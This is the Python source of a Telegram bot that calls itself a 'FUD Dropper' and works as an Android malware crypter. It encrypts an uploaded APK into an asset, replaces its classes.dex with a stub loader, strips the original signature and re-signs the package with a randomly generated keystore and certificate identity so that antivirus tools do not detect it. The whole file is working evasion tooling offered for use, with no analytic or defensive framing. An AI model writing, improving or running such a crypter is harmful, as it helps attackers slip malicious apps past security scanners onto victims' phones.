import os, json, logging, subprocess, shutil, random, string, uuid, base64
from pathlib import Path
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv('BOT_TOKEN')
ALLOWED_USERS = json.loads(os.getenv('ALLOWED_USERS', '[]'))
WORK_DIR = os.getenv('WORK_DIR', '/tmp/work')
TEMP_DIR = os.getenv('TEMP_DIR', '/tmp/temp')

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def ensure_dirs():
    Path(WORK_DIR).mkdir(parents=True, exist_ok=True)
    Path(TEMP_DIR).mkdir(parents=True, exist_ok=True)

def is_allowed(uid):
    return not ALLOWED_USERS or uid in ALLOWED_USERS

def run_cmd(cmd, timeout=300):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0:
            logger.error(f"Cmd failed: {' '.join(cmd)}\n{r.stderr}")
            return False
        return True
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return False

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def zip_dropper(input_apk: str, output_apk: str) -> bool:
    ensure_dirs()
    try:
        # 1. Encrypt original APK
        key = os.urandom(16)
        key_hex = base64.b16encode(key).decode().lower()
        encrypted_payload = os.path.join(TEMP_DIR, 'payload.apk.enc')
        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', input_apk, '-out', encrypted_payload], timeout=60):
            return False

        # 2. Create patched APK (ZIP)
        import zipfile
        patched_apk = os.path.join(TEMP_DIR, 'patched.apk')
        with zipfile.ZipFile(input_apk, 'r') as zin:
            with zipfile.ZipFile(patched_apk, 'w', zipfile.ZIP_DEFLATED) as zout:
                for item in zin.infolist():
                    # Remove original signature and original classes.dex
                    if item.filename.startswith('META-INF/') or item.filename == 'classes.dex':
                        continue
                    if item.is_dir():
                        zout.mkdir(item.filename)
                    else:
                        zout.writestr(item, zin.read(item.filename))
                # Add our assets
                zout.write(encrypted_payload, 'assets/payload.apk.enc')
                zout.writestr('assets/key.txt', key_hex)
                # Replace classes.dex with stub.dex (must exist in /app/)
                stub_path = '/app/stub.dex'
                if not os.path.exists(stub_path):
                    logger.error("stub.dex not found at /app/stub.dex")
                    return False
                zout.write(stub_path, 'classes.dex')
                # If the original APK had multiple dex files (classes2.dex etc.), we should also encrypt them
                # but for simplicity, this works for most APKs. For complex APKs, we might need to handle them.
                # We'll skip that for now; most APKs have single dex.

        # 3. Zipalign
        aligned = os.path.join(TEMP_DIR, 'aligned.apk')
        if not run_cmd(['zipalign', '-v', '-p', '4', patched_apk, aligned], timeout=60):
            return False

        # 4. Sign with random keystore
        ks_path = os.path.join(TEMP_DIR, 'rand.keystore')
        ks_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        alias = ''.join(random.choices(string.ascii_letters, k=6))
        dname = f"CN={''.join(random.choices(string.ascii_letters, k=5))}, OU=Dev, O=Org, L=Loc, ST=ST, C={random.choice(['US','GB','IN'])}"
        if not run_cmd(['keytool', '-genkey', '-v', '-keystore', ks_path, '-alias', alias, '-keyalg', 'RSA', '-keysize', '2048', '-validity', '365', '-storepass', ks_pass, '-keypass', ks_pass, '-dname', dname], timeout=30):
            return False
        if not run_cmd(['apksigner', 'sign', '--ks', ks_path, '--ks-pass', f'pass:{ks_pass}', '--ks-key-alias', alias, '--out', output_apk, aligned], timeout=30):
            return False

        return True
    except Exception as e:
        logger.exception("Zip dropper failed")
        return False
    finally:
        for f in [encrypted_payload, patched_apk, aligned, ks_path]:
            try: os.remove(f)
            except: pass

# Telegram handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Access denied.")
        return
    await update.message.reply_text("FUD Dropper Bot ready. Send APK.")

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_allowed(uid):
        await update.message.reply_text("Access denied.")
        return
    doc: Document = update.message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("Only APK accepted.")
        return
    await update.message.reply_text("Processing... (max 1 min)")
    fin = os.path.join(WORK_DIR, f"{uid}_{doc.file_name}")
    await (await doc.get_file()).download_to_drive(fin)
    base, ext = os.path.splitext(doc.file_name)
    fout = os.path.join(WORK_DIR, f"{base}_fud{ext}")
    success = False
    try:
        success = zip_dropper(fin, fout)
    except Exception as e:
        logger.exception("Error")
    try: os.remove(fin)
    except: pass
    if success:
        with open(fout, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(fout), caption="FUD Dropper APK ready.")
        try: os.remove(fout)
        except: pass
    else:
        await update.message.reply_text("Processing failed. Check logs.")
        if os.path.exists(fout): os.remove(fout)

async def err_handler(update, context):
    logger.error(context.error)

def main():
    ensure_dirs()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    app.add_error_handler(err_handler)
    logger.info("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
